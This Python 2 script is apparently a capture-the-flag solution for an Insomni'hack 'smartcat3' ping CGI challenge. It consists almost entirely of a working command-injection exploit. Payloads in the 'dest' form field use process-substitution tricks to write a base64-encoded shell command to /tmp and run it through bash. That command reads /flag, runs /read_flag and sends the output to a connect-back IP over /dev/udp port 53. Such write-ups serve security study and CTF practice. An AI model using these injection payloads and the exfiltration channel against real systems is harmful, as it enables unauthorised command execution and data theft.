#!/usr/bin/env python2
# encoding: utf-8

import requests
import time

# Run 'nc -lu 53' to receive the flag

URL = "http://smartcat3.insomni.hack/cgi-bin/ping.cgi"
CONNECT_BACK_IP = "192.168.199.102"

CMD = "(id; ls /; cat /flag; (echo 'Give me a...' ; sleep 2; echo '... flag!') | /read_flag; id) > /dev/udp/%s/53\n" % CONNECT_BACK_IP

COMMANDS = [
    "test.com>><(cat<<<base64>/tmp/awe_sploit)",
    "test.com>><(cat<<<-d>>/tmp/awe_sploit)",
    "test.com>><(cat<<</tmp/awe_sploit2>>/tmp/awe_sploit)",
    "test.com>><(cat<<<%s>/tmp/awe_sploit2)" % CMD.encode("base64").replace("\n", ""),
    "test.com>><(((xargs</tmp/awe_sploit>>>(bash))>>>(bash))>/tmp/tg)",
]

for cmd in COMMANDS:
    print '[+] payload:', cmd
    req = requests.post(URL, data={'dest': cmd})
    time.sleep(0.5)
